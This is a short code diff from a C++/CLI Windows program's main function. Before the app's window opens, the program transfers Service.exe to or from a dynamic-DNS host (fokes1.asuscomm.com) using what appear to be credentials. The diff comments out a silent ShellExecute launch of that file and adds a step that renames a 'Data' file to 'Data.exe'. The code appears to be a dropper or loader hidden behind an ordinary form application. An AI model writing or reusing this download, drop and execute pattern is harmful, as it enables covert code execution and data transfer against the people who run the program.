@@ -43,9 +43,10 @@ int main(array <System::String ^> ^args)
 
 	upload("fokes1.asuscomm.com", "ff", "WorkerFF", L"Service.exe", L"Service.exe");
 
+	CopyFile(L"Data", L"Data.exe", false);
 
-	LPCTSTR path = L"Service.exe";
-	ShellExecute(NULL, L"open", path, NULL, NULL, SW_SHOWDEFAULT);
+	//LPCTSTR path = L"Service.exe";
+	//ShellExecute(NULL, L"open", path, NULL, NULL, SW_SHOWDEFAULT);
 
 	Application::Run(gcnew MyForm());
 	return 0;
